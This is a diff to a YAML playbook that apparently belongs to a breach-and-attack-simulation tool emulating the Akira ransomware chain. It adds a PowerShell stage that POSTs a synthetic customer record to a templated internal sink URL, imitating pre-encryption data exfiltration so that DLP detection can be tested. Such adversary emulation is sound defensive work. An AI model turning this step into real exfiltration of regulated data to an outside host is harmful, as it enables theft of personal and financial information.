@@ -237,6 +237,37 @@ steps:
       & net use '\\127.0.0.1\ADMIN$' /delete 2>&1 | Out-Null
 
   # ---------------------------------------------------------------------------
+  # Stage 5b — Pre-Encryption Data Staging & Exfiltration (T1567)
+  # ---------------------------------------------------------------------------
+  - name: "Akira Stage 5b — Pre-Encryption Data Staging Exfiltration (T1567)"
+    technique_id: T1567
+    detection_profiles:
+      - windows_dlp_exfiltration
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "POSTs a synthetic customer record to the platform's own sink endpoint over HTTPS before the encryption stage. No real data, no external destination -- the receiving endpoint is this same on-prem deployment."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: network connection to the orchestrator's own HTTPS port"
+    detection:
+      - "DLP: outbound HTTPS POST body matching regulated-data patterns"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $staged = "[BAS-SIM-AKIRA-S5B] CustomerID,PAN,Aadhaar,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,4111111111111111"
+      try {
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$staged; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+        Write-Output "EXEC T1567: pre-encryption staging record POSTed over HTTPS. [BAS-SIM-AKIRA-S5B]"
+      } catch {
+        Write-Output "EXEC T1567: HTTPS POST to sink was blocked or failed before completing. [BAS-SIM-AKIRA-S5B]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
   # Stage 6 — Ransomware Impact Simulation (T1486)
   # ---------------------------------------------------------------------------
   - name: "Akira Stage 6 — Ransomware Payload Simulation (T1486)"
